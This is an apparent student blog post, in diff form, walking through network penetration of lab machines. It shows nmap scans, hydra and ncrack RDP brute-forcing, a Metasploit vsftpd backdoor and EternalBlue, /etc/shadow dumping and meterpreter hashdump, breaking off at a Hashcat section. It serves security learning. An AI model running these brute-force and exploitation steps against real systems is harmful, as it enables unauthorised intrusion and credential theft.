+    <li><a href="#7-exploiting-windows-remote-management-winrm">7. Exploiting Windows Remote Management WinRM</a>
+      <ul>
+        <li><a href="#71-winrm-enumerating-with-msf">7.1 WinRM enumerating with MSF</a></li>
+        <li><a href="#72-exploit-winrm-with-msf">7.2 Exploit winrm with MSF</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-exploiting-simple-network-management-protocol-snmp-with-msf">8. Exploiting Simple Network Management Protocol SNMP with MSF</a></li>
+    <li><a href="#9-watering-hole-attacks">9. Watering hole attacks</a></li>
+    <li><a href="#10-conclusion">10. Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-discovering-live-systems">1. Discovering live systems</a>
+      <ul>
+        <li><a href="#11-scanning-for-available-devices-using-netdiscover">1.1 Scanning for available devices using Netdiscover</a></li>
+        <li><a href="#12-scanning-for-available-devices-using-nmap">1.2 Scanning for available devices using Nmap</a></li>
+        <li><a href="#13-scanning-for-available-devices-using-nbtscan">1.3 Scanning for available devices using nbtscan</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-profiling-a-target-system">2. Profiling a target system</a>
+      <ul>
+        <li><a href="#21-using-nmap-to-scan-for-os-versions">2.1 Using Nmap to scan for OS versions</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploring-password-based-attacks">3. Exploring password-based attacks</a>
+      <ul>
+        <li><a href="#31-using-ncrack-to-guest-passwords-online">3.1 Using Ncrack to guest passwords online</a></li>
+        <li><a href="#32-using-hydra-to-guest-passwords-online">3.2 Using Hydra to guest passwords online</a></li>
+        <li><a href="#33-exploiting-remote-desktop-protocol-rdp">3.3 Exploiting Remote Desktop Protocol (RDP)</a></li>
+        <li><a href="#34-creating-custom-wordlistsdictionary-using-cewl">3.4 Creating custom wordlists/dictionary using CeWl</a></li>
+        <li><a href="#35-creating-custom-wordlistsdictionary-using-crunch">3.5 Creating custom wordlists/dictionary using Crunch</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-identifying-and-exploiting-vulnerable-services">4. Identifying and Exploiting Vulnerable services</a>
+      <ul>
+        <li><a href="#41-anonymous-login-misconfiguration-on-ftp">4.1 Anonymous Login Misconfiguration on FTP</a></li>
+        <li><a href="#42-smb-eternalblue-vulnerability">4.2 SMB Eternalblue vulnerability</a></li>
+        <li><a href="#43-cracking-passwords-with-hashcat">4.3 Cracking Passwords with Hashcat</a></li>
+        <li><a href="#44-getting-a-shell-with-psexec">4.4 Getting a shell with PsExec</a></li>
+        <li><a href="#45-accessing-remote-shares-using-smbclient">4.5 Accessing remote shares using SMBclient</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-passing-the-hash-technique">5 Passing the Hash Technique</a>
+      <ul>
+        <li><a href="#51-getting-that-shell-with-pth-winexe">5.1 Getting that shell with PTH-WinExe</a></li>
+        <li><a href="#52-impacket-the-tool-to-rule-them-all">5.2 Impacket, the tool to rule them all</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-gaining-access-by-exploiting-ssh">6. Gaining Access by Exploiting SSH</a></li>
+    <li><a href="#7-exploiting-windows-remote-management-winrm">7. Exploiting Windows Remote Management WinRM</a>
+      <ul>
+        <li><a href="#71-winrm-enumerating-with-msf">7.1 WinRM enumerating with MSF</a></li>
+        <li><a href="#72-exploit-winrm-with-msf">7.2 Exploit winrm with MSF</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-exploiting-simple-network-management-protocol-snmp-with-msf">8. Exploiting Simple Network Management Protocol SNMP with MSF</a></li>
+    <li><a href="#9-watering-hole-attacks">9. Watering hole attacks</a></li>
+    <li><a href="#10-conclusion">10. Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+  <details
+    class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 ml-0"
+    >
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+    Ultimate-Kali-Linux-Book -
+    This article is part of a series.
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 2:
+          Part 1 Building a Penetesting Lab
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 3:
+          Part 2 Reconnaissance and Footprint
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 4:
+          Part 3 Exploring Active Reconnaissance Techniques
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/">
+          Part 5:
+          Part 5 Understanding Reverse and Binding Shell
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 6:
+          Part 4 Performing Vulnerability Assessments
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part 7:
+        This Article
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+          Part 8:
+          Part 7 Advanced Network Penetration Testing Post Exploitation
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Another sunny day here down the sea front, slight morning breeze, have a runny nose and sunsets are starting to look purple which are quite the site. A perfect season to do my CTF training in the morning when the sparrows start to chirp; relax in the afternoon for a bike ride, this will be my routine for the end of my first year of Uni ! Summer here we come.⛅</p>
+<p>Lots of exciting stuff has happened but I&rsquo;ll keep it short:</p>
+<ol>
+<li>Had a fantastic idea last night for a project which will last a lifetime, a project that will be updated and released on a three-year cycle. It&rsquo;s very ambitious which some may say, impossible, with balancing University, Gym, Bouldering, Best friends, watch/read anime, read and more ! This is just asking for a burnout at this point lol how does he do it ?</li>
+</ol>
+<ul>
+<li><strong>Time management</strong>, and seeing how spinning multiple plates is like by seeing how many I can hold one at the time, what happens when I spin one faster than the others? what happens to the balance of it all? How I deal with all plates falling off etc. Truly a worthwhile skill to have which I have been working on for over 2 years now and will reveal more over the future.</li>
+</ul>
+<ol start="2">
+<li>
+<p>Have a whole bunch of trips, events and holidays coming up! Lazer tag for end of Uni this Thursday, camping on the 26th, Belgium and more !</p>
+</li>
+<li>
+<p>The house sparrows have grown in numbers this year, it truly brings us a rich garden, I think it may be from the papa and mama bringing children here, it&rsquo;s great for the plants and they&rsquo;re experimenting with how other trees feel around because there&rsquo;s so many! Love to watch them sit to share stuff they&rsquo;ve learned, forming communities which help each other against the jaguars(cat) that lurks in the bushes ready to pounce if one left alone, fall in love and form families all outside my bedroom window.</p>
+</li>
+</ol>
+<p>Anyway, enough of a life update and lets talk Networking Penetration baby. This is one of the most important discipline to learn when testing the security of an organisation, understanding how to navigate around a network could expose vulnerable devices which could be leveraged for higher privileges or probed for credentials.</p>
+
+<h2 class="relative group">1. Discovering live systems 
+    <div id="1-discovering-live-systems" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1-discovering-live-systems" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>When pentesting an organisation they may give you internal access to the network along with an agreement of what scope of the system should be targeted, make sure this agreement isn&rsquo;t breached as this can break legal agreements.</p>
+<p>I will be using metasploitable 2 and metasploitable 3 created in the labs section <a
+  href="../part-1-buidling-a-penetration-testing-labs/#4-setting-up-metasploitable-2">[4. Setting up Metasploitable 2]</a></p>
+
+<h3 class="relative group">1.1 Scanning for available devices using Netdiscover 
+    <div id="11-scanning-for-available-devices-using-netdiscover" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#11-scanning-for-available-devices-using-netdiscover" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using netdiscover, I will scan for available devices within a range, make sure vm or attacking machine isn&rsquo;t connected to the internet or other networks as the scan can pick up on other devices. This is a stealthy way of scanning for devices as it listens for ARP messages sent by hosts.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo netdiscover -pf <span class="c1"># Random, passive fast scan</span>
+</span></span><span class="line"><span class="cl">$ sudo netdiscover -r 172.30.1.0/24 -i eth1 <span class="c1"># Range scan and NIC </span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="netdiscover-demo" src="netdiscover-demo.png">
+
+  
+</figure>
+
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md" style="background-color: #e5f0fc"
+  
+  >
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #086ddd"
+    
+    >
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32C114.6 32 .0272 125.1 .0272 240c0 49.63 21.35 94.98 56.97 130.7c-12.5 50.37-54.27 95.27-54.77 95.77c-2.25 2.25-2.875 5.734-1.5 8.734C1.979 478.2 4.75 480 8 480c66.25 0 115.1-31.76 140.6-51.39C181.2 440.9 217.6 448 256 448c141.4 0 255.1-93.13 255.1-208S397.4 32 256 32z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      style="color: #086ddd"
+    
+    >Sometimes ICMP probing can be disabled on some network to avoid hacker from discovering systems on a network</span>
+</div>
+</p>
+
+<h3 class="relative group">1.2 Scanning for available devices using Nmap 
+    <div id="12-scanning-for-available-devices-using-nmap" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#12-scanning-for-available-devices-using-nmap" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -sn 172.30.1.0/24
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Nmap-network-discover-demo" src="Nmap-network-discover-demo.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">1.3 Scanning for available devices using nbtscan 
+    <div id="13-scanning-for-available-devices-using-nbtscan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#13-scanning-for-available-devices-using-nbtscan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using <code>nbtscan</code> to scan for any file sharing systems running on the network with <code>sudo nbtscan -r 172.30.1.0/24</code>
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="nbtscan-demo" src="nbtscan-demo.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">2. Profiling a target system 
+    <div id="2-profiling-a-target-system" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2-profiling-a-target-system" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>It is important to perform as much recon on a target such as scanning for ports, OS version, running services as most systems run software on an older version as updating to a newer version will mean down-time due to having to reconfigure or it not being compatible with other software within the infrastructure. Sometimes the system just works so there is no need to update to a newer version ¯_(ツ)_/¯</p>
+
+<h3 class="relative group">2.1 Using Nmap to scan for OS versions 
+    <div id="21-using-nmap-to-scan-for-os-versions" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#21-using-nmap-to-scan-for-os-versions" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -A 172.30.1.21
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Nmap-OS-Probing" src="Nmap-OS-Probing.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">3. Exploring password-based attacks 
+    <div id="3-exploring-password-based-attacks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#3-exploring-password-based-attacks" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>There are a wide range of techniques to crack accounts, login portals and password-protected files or devices:</p>
+<ul>
+<li>Brute force - Using combination list of possible passwords
+<ul>
+<li>Password spraying - Using the same password on multiple accounts</li>
+</ul>
+</li>
+<li>Dictionary attack - Using a list of common words and phrases</li>
+<li>Password guessing</li>
+<li>Password cracking - Uses tools and techniques to retrieve login credentials</li>
+<li>Credential stuffing - Use password from a breached database Username:Password on multiple platform for credential overlap.</li>
+<li>Online password attacks - Web based or protocol cracking</li>
+<li>Offline password attacks - Password-protected devices, zip files, encrypted drives etc.</li>
+</ul>
+
+<h3 class="relative group">3.1 Using Ncrack to guest passwords online 
+    <div id="31-using-ncrack-to-guest-passwords-online" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#31-using-ncrack-to-guest-passwords-online" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>For this I will be using the Win2k8 vagrant machine as a victim and will be attacking the rdp protocol hosted on port 3389, here is a nmap scan with script probing:
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="RDP-nmap-scan" src="RDP-nmap-scan.png">
+
+  
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ncrack -vv -T <span class="m">3</span> -u Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Ncrack 0.7 <span class="o">(</span> http://ncrack.org <span class="o">)</span> at 2024-06-13 06:46 BST
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Discovered credentials on rdp://172.30.1.21:3389 <span class="s1">&#39;Administrator&#39;</span> <span class="s1">&#39;vagrant&#39;</span>
+</span></span></code></pre></div>
+<h3 class="relative group">3.2 Using Hydra to guest passwords online 
+    <div id="32-using-hydra-to-guest-passwords-online" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#32-using-hydra-to-guest-passwords-online" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Hydra is another popular online cracking tool which has multiple uses to target web pages and protocols, a great tool to have. Same target as 3.1:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hydra -t <span class="m">4</span> -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21
+</span></span></code></pre></div><ul>
+<li>Results:
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Hydra-cracking-demo" src="Hydra-cracking-demo.png">
+
+  
+</figure>
+</li>
+</ul>
+
+<h3 class="relative group">3.3 Exploiting Remote Desktop Protocol (RDP) 
+    <div id="33-exploiting-remote-desktop-protocol-rdp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#33-exploiting-remote-desktop-protocol-rdp" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>With the password cracked from 3.1 and 3.2 I can use the <code>rdesktop</code> tool to remotely access which should give me full view and control of the user which is <code>Administrator:vagrant</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rdesktop -u Administrator -p vagrant 172.30.1.21:3389 -g 1280x1024
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="RDP-Connection-Exploitedv" src="RDP-Connection-Exploited.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">3.4 Creating custom wordlists/dictionary using CeWl 
+    <div id="34-creating-custom-wordlistsdictionary-using-cewl" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#34-creating-custom-wordlistsdictionary-using-cewl" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>When using a brute force dictionary attack like in 3.1 and 3.2 if the password isn&rsquo;t contained within the wordlist then there will be no access.</p>
+<p>There are many tools to generate custom wordlists with specific regex, CeWL is unique as it takes a website as an input for generating a wordlist by using common words used on the website.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cewl example.com -m <span class="m">6</span> -w output_dictionary_file.txt
+</span></span></code></pre></div><p>website:
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Example-com" src="Example-com.png">
+
+  
+</figure>
+
+Results:</p>
+<pre tabindex="0"><code>Example
+Domain
+domain
+illustrative
+examples
+documents
+literature
+without
+coordination
+asking
+permission
+information
+</code></pre>
+<h3 class="relative group">3.5 Creating custom wordlists/dictionary using Crunch 
+    <div id="35-creating-custom-wordlistsdictionary-using-crunch" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#35-creating-custom-wordlistsdictionary-using-crunch" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md" style="background-color: #352223"
+  
+  >
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #fe4651"
+    
+    >
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M352 96V99.56C352 115.3 339.3 128 323.6 128H188.4C172.7 128 159.1 115.3 159.1 99.56V96C159.1 42.98 202.1 0 255.1 0C309 0 352 42.98 352 96zM41.37 105.4C53.87 92.88 74.13 92.88 86.63 105.4L150.6 169.4C151.3 170 151.9 170.7 152.5 171.4C166.8 164.1 182.9 160 199.1 160H312C329.1 160 345.2 164.1 359.5 171.4C360.1 170.7 360.7 170 361.4 169.4L425.4 105.4C437.9 92.88 458.1 92.88 470.6 105.4C483.1 117.9 483.1 138.1 470.6 150.6L406.6 214.6C405.1 215.3 405.3 215.9 404.6 216.5C410.7 228.5 414.6 241.9 415.7 256H480C497.7 256 512 270.3 512 288C512 305.7 497.7 320 480 320H416C416 344.6 410.5 367.8 400.6 388.6C402.7 389.9 404.8 391.5 406.6 393.4L470.6 457.4C483.1 469.9 483.1 490.1 470.6 502.6C458.1 515.1 437.9 515.1 425.4 502.6L362.3 439.6C337.8 461.4 306.5 475.8 272 479.2V240C272 231.2 264.8 224 255.1 224C247.2 224 239.1 231.2 239.1 240V479.2C205.5 475.8 174.2 461.4 149.7 439.6L86.63 502.6C74.13 515.1 53.87 515.1 41.37 502.6C28.88 490.1 28.88 469.9 41.37 457.4L105.4 393.4C107.2 391.5 109.3 389.9 111.4 388.6C101.5 367.8 96 344.6 96 320H32C14.33 320 0 305.7 0 288C0 270.3 14.33 256 32 256H96.3C97.38 241.9 101.3 228.5 107.4 216.5C106.7 215.9 106 215.3 105.4 214.6L41.37 150.6C28.88 138.1 28.88 117.9 41.37 105.4H41.37z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      style="color: #fe4651"
+    
+    >Seems to throw a <code>setlocale() failed</code> error may require fix on main pc</span>
+</div>
+
+<p>Crunch allows for custom wordlist generation which can be done by providing a min and max character count along with some key words and rules to generate every possible combination using what has been provided</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crunch <span class="m">4</span> <span class="m">4</span> 0123456789ABC -o output_file.txt
+</span></span></code></pre></div>
+<h2 class="relative group">4. Identifying and Exploiting Vulnerable services 
+    <div id="4-identifying-and-exploiting-vulnerable-services" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#4-identifying-and-exploiting-vulnerable-services" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>In this section I will be exploiting plain login access for File Transfer Protocol (FTP) and Server Messaging Block (SMB)</p>
+
+<h3 class="relative group">4.1 Anonymous Login Misconfiguration on FTP 
+    <div id="41-anonymous-login-misconfiguration-on-ftp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#41-anonymous-login-misconfiguration-on-ftp" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>File Transfer Protocol commonly on port 21 is used to allow external access from other machines to a storage server as a way to download files remotely.</p>
+<p>Upon scanning the Win2k8 machine I can see that a misconfiguration to the server has been made which allows for anonymous FTP login. Tut-tut, an easy prey, very naughty.</p>
+<ol>
+<li>
+<p>Nmap script probing scan on Win2k8 lab machine we can see that login in with the user Anonymous:<any input> will grant access but something more interest appeared:
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="FTP-anon-login" src="FTP-anon-login.png">
+
+  
+</figure>
+</p>
+</li>
+<li>
+<p>Looking up &ldquo;vsFTPd 2.3.4 vulnerability&rdquo; on the internet shows a metasploitable module which can give me a backdoor to the prey. Load msf and module <code>unix/ftp/vsftpd_234_backdoor</code></p>
+</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="FTP-234-pwd" src="FTP-234-pwd.png">
+
+  
+</figure>
+</p>
+<ol start="3">
+<li>After gaining a reverse shell I spawned a python-based pseudo terminal in the bind shell with <code>python -c </code>import pty:pty.spawn(&quot;/bin/bash&quot;)`</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="FTP-python-shell" src="FTP-python-shell.png">
+
+  
+</figure>
+</p>
+<ol start="4">
+<li>Listed passwords stored in <code>/etc/shadows</code> which I then saved in a txt file to be cracked using John the Ripper</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="FTP-John-Cracked" src="FTP-John-Cracked.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">4.2 SMB Eternalblue vulnerability 
+    <div id="42-smb-eternalblue-vulnerability" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#42-smb-eternalblue-vulnerability" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md" style="background-color: #e5f0fc"
+  
+  >
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #086ddd"
+    
+    >
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32C114.6 32 .0272 125.1 .0272 240c0 49.63 21.35 94.98 56.97 130.7c-12.5 50.37-54.27 95.27-54.77 95.77c-2.25 2.25-2.875 5.734-1.5 8.734C1.979 478.2 4.75 480 8 480c66.25 0 115.1-31.76 140.6-51.39C181.2 440.9 217.6 448 256 448c141.4 0 255.1-93.13 255.1-208S397.4 32 256 32z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      style="color: #086ddd"
+    
+    >more on SMB open at HackTricks: <a
+  href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
+    target="_blank"
+  >https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb</a></span>
+</div>
+
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="SMB-Diagram" src="SMB-Diagram.png">
+
+  
+</figure>
+</p>
+<p>SMB is a protocol used to send files over one connected device such as nodes, printers and serial ports on a network. Commonly hosted on port 445, 135-139, SMB is commonly used on Windows machines.</p>
+<ol>
+<li>First Nmap scan common SMB port range between 135-139:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="smb-nmap-scan" src="SMB-Nmap-135.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>See that the Win2k8 machine is using Windows Server 2008 and load up the MSF <code>windows/smb/ms17_010_eternalblue</code> module:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="msf-ms17-eternalblue" src="msf-ms17-eternalblue.png">
+
+  
+</figure>
+</p>
+<ol start="3">
+<li>After getting a shell, retrieved login accounts and password hash credentials with the <code>hashdump</code> command in meterpreter and checked hash ID:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Meterpreter-hashdump" src="Meterpreter-hashdump.png">
+
+  
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="hashid-check" src="hashid-check.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">4.3 Cracking Passwords with Hashcat 
+    <div id="43-cracking-passwords-with-hashcat" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#43-cracking-passwords-with-hashcat" aria-label="Anchor">#</a>
+    </span>        
+    
